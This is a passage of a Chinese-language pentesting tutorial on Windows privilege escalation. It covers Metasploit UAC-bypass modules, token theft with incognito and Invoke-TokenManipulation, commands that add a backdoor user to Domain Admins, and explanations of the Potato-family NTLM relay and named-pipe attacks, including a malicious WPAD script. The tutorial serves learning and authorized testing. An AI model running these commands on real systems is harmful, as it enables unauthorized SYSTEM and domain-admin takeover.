<pre><code class="hljs scss"><span class="hljs-number">1</span>. exploit/windows/local/ask       <span class="hljs-comment">// 弹出UAC确认窗口，点击后获得system权限</span>

<span class="hljs-number">2</span>. exploit/windows/local/bypassuac
<span class="hljs-comment">// 此模块将通过进程注入使用可信任发布者证书绕过Windows UAC，它将生成关闭UAC标志的第二个shell。</span>

<span class="hljs-number">3</span>. exploit/windows/local/bypassuac_injection 
   <span class="hljs-comment">// 此模块将通过进程注入使用可信任的发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。在普通技术中，该模块使用反射式DLL注入技术并只除去了DLL payload 二进制文件，而不是三个单独的二进制文件。但是，它需要选择正确的体系架构（对于SYSWOW64系统也使用x64）。如果指定exe::custom，应在单独的进程中启动 payload 后调用ExitProcess（）</span>


<span class="hljs-number">4</span>. exploit/windows/local/bypassuac_fodhelper
   <span class="hljs-comment">// 此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定exe:custom，则应在单独的进程中启动payload后调用ExitProcess（）。</span>

<span class="hljs-number">5</span>. exploit/windows/local/bypassuac_eventvwr
   <span class="hljs-comment">// 此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定EXE ::Custom，则应在单独的进程中启动payload后调用ExitProcess（）</span>

<span class="hljs-number">6</span>. exploit/windows/local/bypassuac_comhijack
   <span class="hljs-comment">// 此模块将通过在hkcu配置单元中创建COM处理程序注册表项来绕过Windows UAC。当加载某些较高完整性级别进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL,这些DLL包含导致会话权限提升的payload。此模块修改注册表项，但在调用payload后将清除该项,这个模块需要payload的体系架构和操作系统匹配，但是当前的低权限meterpreter会话体系架构中可能不同。如果指定exe:：custom，则应在单独的进程中启动payloa后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件,因此，如果cmd.exe访问受到限制，此模块将无法正常运行。</span></code></pre>
<p>针对上述模块，具体也可参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/10552137.html" title="发布于 2019-03-18 14:50">使用Metasploit绕过UAC的多种方法</a></p>
<p><strong>MSF中Bypassuac模块的使用前提有两个</strong></p>
<blockquote>
<p>一是系统当前用户必须在管理员组中<br>
二是用户账户控制程序UAC设置为默认，即 “仅在程序试图更改我的计算机时通知我”</p>
</blockquote>
<p>使用 exploit/windows/local/ask 模块，需要使用 EXE::Custom 选项创建一个可执行文件(需要免杀)，目标机器会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果用户选择继续运行程序，就会返回一个高权限的shell。</p>
<p>使用该模块的前提：</p>
<pre><code class="hljs scss"># 当前用户必须在管理员组中 或 知道管理员的密码，对UAC的设置则没有要求。
# 用户需要手动点击弹出的程序，是</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547457.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547458.png" alt></p>
<h2 id="powershell脚本">PowerShell脚本</h2>
<pre><code class="hljs scss"><span class="hljs-selector-id">#Powershell</span>
Invoke-PsUACme</code></pre>
<p>Invoke-PsUACme模块使用来自UACME项目的DLL绕过UAC。</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-PsUACme</span>.ps1;<span class="hljs-built_in">Invoke-PsUACme</span> <span class="hljs-literal">-verbose</span> <span class="hljs-comment">#使用sysprep方法并执行默认的payload  </span>
<span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-PsUACme</span>.ps1;<span class="hljs-built_in">Invoke-PsUACme</span> <span class="hljs-literal">-method</span> oobe <span class="hljs-literal">-verbose</span> <span class="hljs-comment">#使用oobe方法并执行默认的payload</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547459.png" alt></p>
<p>可以看到成功添加hack用户 没有提示拒绝访问(普通用户权限会提示拒绝访问)</p>
<h2 id="其他">其他</h2>
<pre><code class="hljs scss"><span class="hljs-selector-id">#Empire</span>
usemodule privesc/bypassuac
usemodule privesc/bypassuac_wscript

<span class="hljs-selector-id">#cs</span>
uac-dll
uac-token-duplication</code></pre>
<h1 id="0x07-令牌窃取提权">0x07 令牌窃取提权</h1>
<blockquote>
<p>简介：令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。</p>
<p>令牌有很多种：<br>
访问令牌(Access Token)：表示访问控制操作主体的系统对象 。<br>
会话令牌(Session Token)：是交互会话中唯一的身份标识符。<br>
密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如U盾。</p>
</blockquote>
<h2 id="基本知识">基本知识</h2>
<p>Windows的AccessToken有两种类型：</p>
<pre><code class="hljs scss">Delegation Token：授权令牌，它支持交互式会话登录(例如本地用户直接登录、远程桌面登录访问)

Impresonation Token：模拟令牌，它是非交互的会话(例如使用net use访问共享文件夹)</code></pre>
<p>Windows Access Token产生过程</p>
<pre><code class="hljs scss">每个进程创建时都会根据登录会话权限由<span class="hljs-built_in">LSA</span>(Local Security Authority)分配一个<span class="hljs-built_in">Token</span>(如果CreaetProcess时自己指定了 Token, LSA会用该Token， 否则就用父进程Token的一份拷贝。</code></pre>
<p>AccessToken的窃取与利用</p>
<pre><code class="hljs scss">AccessToken的窃取与利用需要administrator管理员组权限。窃取AccessToken的数量：

incognito<span class="hljs-selector-class">.exe</span>程序 &gt; InvokeTokenManipulat<span class="hljs-selector-class">.ps1</span>脚本 &gt; MSF里的incognito模块</code></pre>
<h2 id="程序-incognitoexe">程序 incognito.exe</h2>
<p>找了一下，这个网址没了，看到github有一个，不知道是否有用<br>
<a target="_blank" rel="noopener" href="https://github.com/milkdevil/incognito2?tab=readme-ov-file">https://github.com/milkdevil/incognito2?tab=readme-ov-file</a></p>
<p>AccessToken的列举(需要administrator权限)：<code>incognito.exe list_tokens -u</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547460.png" alt></p>
<p><strong>模拟其他用户的令牌</strong></p>
<pre><code class="hljs powershell">incognito.exe execute <span class="hljs-literal">-c</span> <span class="hljs-string">"完整的Token名"</span> cmd.exe
<span class="hljs-comment">#例如：模拟system权限用户</span>
incognito.exe execute <span class="hljs-literal">-c</span> <span class="hljs-string">"NT AUTHORITY\SYSTEM"</span> cmd.exe</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547461.png" alt></p>
<h2 id="invoke-tokenmanipulationps1脚本">Invoke-TokenManipulation.ps1脚本</h2>
<p>这个脚本是PowerSploit下Exfiltration文件夹内的一个脚本  ，使用命令如下：</p>
<pre><code class="hljs powershell"><span class="hljs-comment">#列举token</span>
<span class="hljs-built_in">Invoke-TokenManipulation</span> <span class="hljs-literal">-Enumerate</span>

<span class="hljs-comment">#提权至system</span>
<span class="hljs-built_in">Invoke-TokenManipulation</span> <span class="hljs-literal">-CreateProcess</span> <span class="hljs-string">"cmd.exe"</span> <span class="hljs-literal">-username</span> <span class="hljs-string">"nt authority\system"</span>

<span class="hljs-comment">#复制进程token</span>
<span class="hljs-built_in">Invoke-TokenManipulation</span> <span class="hljs-literal">-CreateProcess</span> <span class="hljs-string">"cmd.exe"</span> <span class="hljs-literal">-ProcessId</span> <span class="hljs-number">500</span>

<span class="hljs-comment">#复制线程token</span>
<span class="hljs-built_in">Invoke-TokenManipulation</span> <span class="hljs-literal">-CreateProcess</span> <span class="hljs-string">"cmd.exe"</span> <span class="hljs-literal">-ThreadId</span> <span class="hljs-number">500</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547462.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547463.png" alt></p>
<h2 id="msf模块">MSF模块</h2>
<p>需要administrator权限</p>
<pre><code class="hljs powershell">use incognito <span class="hljs-comment">#加载incognito</span>
list_tokens <span class="hljs-literal">-u</span> <span class="hljs-comment">#列出AccessToken</span>
impersonate_token <span class="hljs-string">"NT AUTHORITY\SYSTEM"</span> <span class="hljs-comment">#模拟system用户，getsystem命令即实现了该命令。如果要模拟其他用户，将token名改为其他用户即可</span>

rev2self <span class="hljs-comment">#返回到之前的AccessToken权限</span>

<span class="hljs-comment">#域内的话可以添加域用户并添加进域管理组进行敏感操作</span>
add_user hack qwer123456! <span class="hljs-literal">-h</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">13.132</span> 
add_group_user <span class="hljs-string">"Domain Admins"</span> hack <span class="hljs-literal">-h</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">13.132</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547464.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547465.png" alt></p>
<p>比这种好得多的还有<strong>msf烂土豆提权/多汁土豆提权</strong>，优点就是，比较可靠，而且版本通杀。</p>
<h1 id="0x08-potato提权">0x08 Potato提权</h1>
<ul>
<li>
<p><a target="_blank" rel="noopener" href="https://github.com/foxglovesec/Potato">Hot Potato</a>：WPAD或LLMNR/NBNS投毒，让某些高权限系统服务请求自己监听的端口，并要求NTLM认证，然后relay到本地的SMB listener</p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato">Rotten Potato</a>：通过DCOM call来使服务向攻击者监听的端口发起连接并进行NTLM认证,需要SelmpersonatePrivilege权限</p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">Jucy Potato</a>：Rotten Potato的加强版，需要Selmpersonate、SeAssignPrimaryToken 两个权限</p>
</li>
<li>
<p><a href="%5Bhttps://github.com/antonioCoco/RoguePotato%5D(https://github.com/antonioCoco/RoguePotato)">RoguePotato</a>：无</p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a>：利用spoolsv.exe进程的RPC服务器强制Windows主机向其他计算机进行身份验证，需要SelmpersonatePrivilege、SeAssignPrimaryToken权限</p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://github.com/uknowsec/SweetPotato">Sweet Potato</a>：COM/WinRM/Spoolsv的集合版，也就是Juicy/PrintSpoofer，从Windows 7到windows10/windows server2019的本地服务到system特权升级</p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/GodPotato">GodPotato</a>：Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11，需要ImpersonatePrivilege权限</p>
</li>
</ul>
<h2 id="基本知识">基本知识</h2>
<p>简单对上述提权原理有个了解，日后遇到的时候具体感受</p>
<p>利用Potato提权手法的前提是拥有<code>SeImpersonatePrivilege</code>或<code>SeAssignPrimaryTokenPrivilege</code>权限，以下用户拥有<code>SeImpersonatePrivilege</code>权限（而只有更高权限的账户比如SYSTEM才有<code>SeAssignPrimaryTokenPrivilege</code>权限）：</p>
<ul>
<li>本地管理员账户（不包括管理员组普通账户）和本地服务帐户</li>
<li>由SCM启动的服务</li>
</ul>
<blockquote>
<p>注意：<strong>本机测试时即使在本地策略中授予管理员组普通用户<code>SeImpersonatePrivilege</code>特权，在cmd.exe中<code>whoami /priv</code>也不显示该特权，且无法利用；而<code>SeAssignPrimaryTokenPrivilege</code>特权则可以正常授予普通用户</strong></p>
</blockquote>
<h3 id="windows服务的登录账户">Windows服务的登录账户</h3>
<pre><code class="hljs scss"><span class="hljs-number">1</span>. Local <span class="hljs-built_in">System</span>(NT AUTHORITY\System)
     - 它在本地系统上具有最高级别的权限。
     - 如果客户端和服务器都在域中，则本地系统帐户使用 PC 帐户 (hostname$) 登录远程计算机。
     - 如果客户端或服务器不在域中，则本地系统帐户使用匿名登录。
<span class="hljs-number">2</span>. Network <span class="hljs-built_in">Service</span>(NT AUTHORITY\Network Service)
     - 它具有本地系统上无特权普通用户的权限。
     - 访问网络时，其行为与本地系统帐户相同。
<span class="hljs-number">3</span>. Local <span class="hljs-built_in">Service</span>(NT AUTHORITY\Local Service)
     - 它具有本地系统上无特权普通用户的权限。
     - 无论计算机是否在域中，它始终使用匿名登录。</code></pre>
<p>也就是说该提权是</p>
<ul>
<li>Administrator -&gt; SYSTEM</li>
<li>Service -&gt; SYSTEM</li>
</ul>
<h3 id="windows-token">Windows Token</h3>
<p>Windows的token是描述安全上下文的对象，用户登录系统后就会生成token，创建新进程或新线程时这个token会被不断拷贝</p>
<p>Token成员：</p>
<pre><code class="hljs scss">用户账户的(SID)
用户所属的组的SID
用于标识当前登陆会话的登陆SID
用户或用户组所拥有的权限列表
所有者SID
所有者组的SID
访问控制列表
访问令牌的来源
主令牌/模拟令牌
限制SID的可选列表
模拟等级:
       Anonymous: server无法模拟或识别client
       Identification: 可识别client的身份和特权，不能模拟
       Impersonation: 可在本地系统模拟
       Delegation: 可在远程系统上模拟</code></pre>
<pre><code class="hljs scss">C:\WINDOWS\system32&gt;whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                                 State  
=============================== =========================================== =======
SeAssignPrimaryTokenPrivilege   Replace a process level token               Enabled
SeImpersonatePrivilege          Impersonate a client after authentication   Enabled</code></pre>
<ul>
<li>
<p>当用户具有<code>SeImpersonatePrivilege</code>特权，则可以调用<code>CreateProcessWithTokenW</code>以某个Token的权限启动新进程</p>
</li>
<li>
<p>当用户具有<code>SeAssignPrimaryTokenPrivilege</code>特权，则可以调用<code>CreateProcessAsUserW</code>以hToken权限启动新进程</p>
</li>
</ul>
<p>为什么会有一系列<code>Impersonate</code>函数，微软本意是让高权限服务端可以模拟低权限客户端来执行操作以提高安全性，但被攻击者反向使用了</p>
<p>以下案例的具体实践过程，参考如下文章：</p>
<ul>
<li>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/860">Potato提权合集</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://www.geekby.site/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/">potato家族提权分析</a></p>
</li>
</ul>
<h2 id="hot-potato">Hot Potato</h2>
<p>也可以说是最初始的Origin Potato</p>
<p>2016 年 1 月， Dominic White 发表了一篇文章，发布了一种基于 NTLM 反射的权限提升攻击方式，命名为 Hot Potato。可以从主机的最低用户权限提升至系统最高的&nbsp;<code>NT\AUTHORITY SYSTEM</code>&nbsp;权限。</p>
<p>Hot Potato 利用著名的 NTLM Relay 攻击(HTTP -&gt; SMB)和 NBNS 欺骗攻击，获取 Windows 系统的最高权限 SYSTEM。可以从主机的最低用户权限提升至系统最高的 <code>NT\AUTHORITY SYSTEM</code> 权限。</p>
<h3 id="影响范围">影响范围</h3>
<p>Windows 7、8、10、Server 2008 和 Server 2012</p>
<p>如果要更深入地了解这种技术，建议研究人员发布/视频：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://foxglovesecurity.com/2016/01/16/hot-potato/">https://foxglovesecurity.com/2016/01/16/hot-potato/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=8Wjs__mWOKI">https://www.youtube.com/watch?v=8Wjs__mWOKI</a></li>
</ul>
<h3 id="nbns协议">NBNS协议</h3>
<p>NBNS (Net BIOS Name Service)是 Windows 系统中广泛被使用的 UDP 广播服务，即命名查询服务。该服务使用 UDP 协议实现，可以通过发送局域网内广播来实现本地名称解析。</p>
<p>类似于 TCP/IP 协议中的 DNS，它负责查找目标机器相应的 IP 地址，并赋予一个 NetBIOS 名称。微软 WINS 服务就是采用 NBNS协议。</p>
<h4 id="nbns-欺骗">NBNS 欺骗</h4>
<p>系统进行一个名字查询的逻辑如下：</p>
<ol>
<li>首先查询本地的 hosts 文件</li>
<li>DNS Lookup 查询(本地 DNS cache，再向 DNS 服务器请求)</li>
<li>NBNS 查询</li>
</ol>
<p>NBNS 的逻辑是向本地所有主机广播一条消息，谁是 xxx，如果谁响应了该广播消息，谁就是 xxx</p>
<p>在内网渗透测试时，攻击者往往会监听 NBNS 广播消息，并且会应答自己是 xxx，这就是NBNS 欺骗；ARP欺骗是 MAC 层的欺骗方式</p>
<p>NBNS 包有 1 个 2 字节的 TXID 字段，必须进行请求\响应的匹配。因为是提权漏洞，所以攻击之前没有权限可以监听流量。可以通过 1-65535 之间进行泛洪猜测。</p>
<p>如果网络中有 DNS 记录，此时就不会用到 NBNS 协议；可以通过 UDP 端口耗尽的攻击技术，让所有 DNS 查询失败，从而必须使用 NBNS 协议</p>
<h3 id="wpad-代理">WPAD 代理</h3>
<p>Windows 系统里，IE 浏览器会自动检测 IE 代理配置信息，方式是访问，<code>http://wpad/wpad.dat&amp;#8221</code></p>
<p>WPAD 是不一定存在于网络中，因为主机名wpad也不一定存在于DNS服务器中，除非网络想通过配置脚本自动配置网络中的代理信息，这种情况很方便。</p>
<p>因此在 hosts、DNS 查询都不能获取 WPAD 的情况下，系统必然使用 NBNS 进行名字查询，此时可以通过 NBNS 欺骗，告知自己就是 WPAD 可以构造 HTTP 服务器，响应 HTTP&nbsp;<code>http://wpad/wpad.dat&amp;#8221</code>&nbsp;查询</p>
<pre><code class="hljs C">FindProxyForURL(url,host){
<span class="hljs-keyword">if</span> (dnsDomainIs(host, <span class="hljs-string">"localhost"</span>)) <span class="hljs-keyword">return</span> <span class="hljs-string">"DIRECT"</span>;
<span class="hljs-keyword">return</span> <span class="hljs-string">"PROXY 127.0.0.1:80"</span>;}</code></pre>
<h3 id="http-gt-smb-ntlm-relay">HTTP -&gt; SMB NTLM Relay</h3>
<p>借用网上的图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547466.png" alt></p>
<p>NTLM 认证对于中间人攻击的防御能力不强，此前针对 NTLM 的重放攻击聚焦于 SMB -&gt; SMB 协议，反射攻击访问者的主机，获取远程执行权限;</p>
<p>微软通过补丁封堵了 SMB -&gt; SMB 协议的重放反射攻击，但是 HTTP -&gt; SMB 这种跨协议的攻击仍然有效</p>
<h3 id="攻击流程">攻击流程</h3>
<p>Hot Potato 攻击就是结合了这几点，实现权限提升：</p>
<ol>
<li>NBNS 欺骗</li>
<li>构造本地 HTTP，响应 WPAD</li>
<li>HTTP -&gt; SMB NTLM Relay</li>
<li>等待高权限进程的访问，即激活更新服务(低权限可激活)</li>
</ol>
<pre><code class="hljs scss"><span class="hljs-comment">// 下述流程也同上面一致</span>
<span class="hljs-number">1</span>.本地NBNS Spoofer：冒充名称解析，强制系统下载恶意WAPD配置

<span class="hljs-number">2</span>.伪造WPAD代理服务器：部署malicios WAPD配置，强制系统进行NTLM认证

<span class="hljs-number">3</span><span class="hljs-selector-class">.HTTP</span> -&gt; SMB NTLM 中继：将 WAPD NTLM 令牌中继到 SMB 服务以创建提升的进程</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547467.png" alt></p>
<h2 id="rottenpotato-amp-juicypotato">RottenPotato &amp; JuicyPotato</h2>
<blockquote>
<p>此技术不适用于 &gt;= Windows 10 1809 和 Windows Server 2019 的版本</p>
</blockquote>
<h4 id="原理">原理</h4>
<p>这两种不同于初始的 Potato，它是通过 DCOM CALL 来使服务向攻击者监听的端口发起连接并进行 NTLM 认证</p>
<p>Rotten Potato 和 Juicy Potato 几乎是同样的原理，后者在前者的基础上完善。</p>
<p>需要理解的几个知识：</p>
<ol>
<li>使用 DCOM 时，如果以服务的方式远程连接，那么权限为 System，例如 BITS 服务</li>
<li>使用 DCOM 可以通过 TCP 连接到本机的一个端口，发起 NTLM 认证，该认证可以被重放</li>
<li>LocalService 用户默认具有 SeImpersonate 和 SeAssignPrimaryToken 权限</li>
<li>开启 SeImpersonate 权限后，能够在调用 CreateProcessWithToken 时，传入新的 Token 创建新的进程</li>
<li>开启 SeAssignPrimaryToken 权限后，能够在调用 CreateProcessAsUser 时，传入新的 Token 创建新的进程</li>
</ol>
<h4 id="攻击流程">攻击流程</h4>
<ol>
<li>
<p>加载 COM，发出请求，权限为 System：<br>
在指定 ip 和端口的位置尝试加载一个 COM 对象。RottenPotatoNG 使用的 COM 对象为 BITS，CLSID 为&nbsp;<code>{4991d34b-80a1-4291-83b6-3328366b9097}</code>。可供选择的 COM 对象不唯一，Juicy Potato 提供了多个，详细列表可参考如下地址：<br>
<a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p>
</li>
<li>
<p>回应步骤 1 的请求，发起 NTLM 认证：<br>
正常情况下，由于权限不足，当前权限不是 System，无法认证成功</p>
</li>
<li>
<p>针对本地端口，同样发起 NTLM 认证，权限为当前用户：<br>
由于权限为当前用户，所以 NTLM 认证能够成功完成</p>
</li>
</ol>
<blockquote>
<p>注意：RottenPotatoNG 使用的 135 端口<br>
Juicy Potato 支持指定任意本地端口，但是 RPC 一般默认为135端口，很少被修改</p>
</blockquote>
<ol start="4">
<li>
<p>分别拦截两个 NTLM 认证的数据包，替换数据，通过 NTLM 重放使得步骤 1(权限为 System)的 NTLM 认证通过，获得 System 权限的 Token。<br>
重放时需要注意 NTLM 认证的 NTLM Server Challenge 不同，需要修正</p>
</li>
<li>
<p>利用 System 权限的 Token 创建新进程</p>
</li>
</ol>
<blockquote>
<p>如果开启 SeImpersonate 权限，调用 CreateProcessWithToken，传入 System 权限的 Token，创建的进程为 System 权限</p>
<p>或者</p>
<p>如果开启 SeAssignPrimaryToken 权限，调用 CreateProcessAsUser，传入 System 权限的 Token，创建的进程为 System 权限</p>
</blockquote>
<h2 id="printspoofer-pipepotato-or-badpotato">PrintSpoofer (PipePotato or BadPotato)</h2>
<h3 id="原理">原理</h3>
<p>通过 Windows named pipe 的一个 API:&nbsp;<code>ImpersonateNamedPipeClient</code>来模拟高权限客户端的 token（还有类似的<code>ImpersonatedLoggedOnUser</code>，<code>RpcImpersonateClient</code>函数），调用该函数后会更改当前线程的安全上下文，它利用了打印机组件路径检查的 BUG，使 SYSTEM 权限服务能连接到攻击者创建的 named pipe。</p>
<p><code>spoolsv.exe</code>&nbsp;服务有一个公开的 RPC 服务，里面有以下函数：</p>
<pre><code class="hljs C++"><span class="hljs-function">DWORD <span class="hljs-title">RpcRemoteFindFirstPrinterChangeNotificationEx</span><span class="hljs-params">( </span></span>
<span class="hljs-params"><span class="hljs-function">    <span class="hljs-comment">/* [in] */</span> PRINTER_HANDLE hPrinter,</span></span>
<span class="hljs-params"><span class="hljs-function">    <span class="hljs-comment">/* [in] */</span> DWORD fdwFlags,</span></span>
<span class="hljs-params"><span class="hljs-function">    <span class="hljs-comment">/* [in] */</span> DWORD fdwOptions,</span></span>
<span class="hljs-params"><span class="hljs-function">    <span class="hljs-comment">/* [unique][string][in] */</span> <span class="hljs-type">wchar_t</span> *pszLocalMachine,</span></span>
<span class="hljs-params"><span class="hljs-function">    <span class="hljs-comment">/* [in] */</span> DWORD dwPrinterLocal,</span></span>
<span class="hljs-params"><span class="hljs-function">    <span class="hljs-comment">/* [unique][in] */</span> RPC_V2_NOTIFY_OPTIONS *pOptions)</span></span></code></pre>
<p><code>pszLocalMachine</code>参数需要传递 UNC 路径，传递&nbsp;<code>\\127.0.0.1</code>&nbsp;时，服务器会访问&nbsp;<code>\\127.0.0.1\pipe\spoolss</code>，但这个管道已经被系统注册了，如果我们传递&nbsp;<code>\\127.0.0.1\pipe</code>&nbsp;则因为路径检查而报错</p>
<p>但当传递&nbsp;<code>\\127.0.0.1/pipe/foo</code>&nbsp;时，校验路径时会认为&nbsp;<code>127.0.0.1/pipe/foo</code>&nbsp;是主机名，随后在连接 named pipe 时会对参数做标准化，将&nbsp;<code>/</code>&nbsp;转化为&nbsp;<code>\</code>，于是就会连接&nbsp;<code>\\127.0.0.1\pipe\foo\pipe\spoolss</code>，攻击者就可以注册这个 named pipe 从而窃取 client 的 token。这个 POC 启动新进程是使用&nbsp;<code>CreateProcessAsUser</code>&nbsp;而不是&nbsp;<code>CreateProcessWithToken</code>。</p>
<h2 id="roguepotato">RoguePotato</h2>
<h3 id="原理">原理</h3>
<p>这个也是利用了命名管道</p>
<p>微软修补后，高版本 Windows DCOM 解析器不允许 OBJREF 中的 DUALSTRINGARRAY 字段指定端口号。为了绕过这个限制并能做本地令牌协商，作者在一台远程主机上的 135 端口做流量转发，将其转回受害者本机端口，并写了一个恶意 RPC OXID 解析器。</p>
<pre><code class="hljs scss"><span class="hljs-number">1</span>.我们无法在最新的 Windows 版本中为 OXID 解析器地址指定自定义端口

<span class="hljs-number">2</span>.如果我们将 OXID 解析请求重定向到我们控制下的端口 <span class="hljs-number">135</span> 上的远程服务器,并将请求转发到我们的本地 Fake RPC 服务器,我们将仅获得一个匿名登录

<span class="hljs-number">3</span>.如果我们将 OXID 解析请求解析到一个假的 RPC 服务器，我们将在IRemUnkown2接口查询期间获得一个标识令牌</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547468.png" alt></p>
<h3 id="攻击流程">攻击流程</h3>
<pre><code class="hljs scss">Rogue Potato通过指定远程 <span class="hljs-built_in">IP</span>(攻击者 IP)指示 DCOM 服务器执行远程 OXID 查询

在远程 IP 上，设置一个"socat"侦听器，用于将 OXID 解析请求重定向到一个假的OXID RPC 服务器

伪造的OXID RPC 服务器实现了ResolveOxid2服务器过程，该过程将指向受控命名管道<span class="hljs-selector-attr">[ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]</span>

DCOM 服务器将连接到 RPC 服务器以执行IRemUnkown2接口调用。通过连接到命名管道，将执行"身份验证回调"，我们可以通过 <span class="hljs-built_in">RpcImpersonateClient</span>()调用模拟调用者。

然后,令牌窃取者
  <span class="hljs-number">1</span>.获取rpcss服务的PID
  <span class="hljs-number">2</span>.打开进程，列出所有句柄，并为每个句柄尝试复制它并获取句柄类型
  <span class="hljs-number">3</span>.如果句柄类型为"Token"且令牌所有者为 SYSTEM，则尝试使用<span class="hljs-built_in">CreatProcessAsUser</span>()或<span class="hljs-built_in">CreateProcessWithToken</span>()模拟并启动进程</code></pre>
<h2 id="sweetpotato">SweetPotato</h2>
<p>COM/WinRM/Spoolsv 的集合版，也就是 Juicy/PrintSpoofer 的集合版</p>
<h2 id="ghost-potato">Ghost potato</h2>
<p><strong>相关文章</strong>：<a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html">Ghost Potato</a></p>
<p>这个漏洞绕过了&nbsp;<code>MS08-068</code>&nbsp;之后，用户不能&nbsp;<code>relay</code>&nbsp;回本机的限制。</p>
<p><a target="_blank" rel="noopener" href="https://shenaniganslabs.io/files/impacket-ghostpotato.zip">ghostpotato-利用工具</a></p>
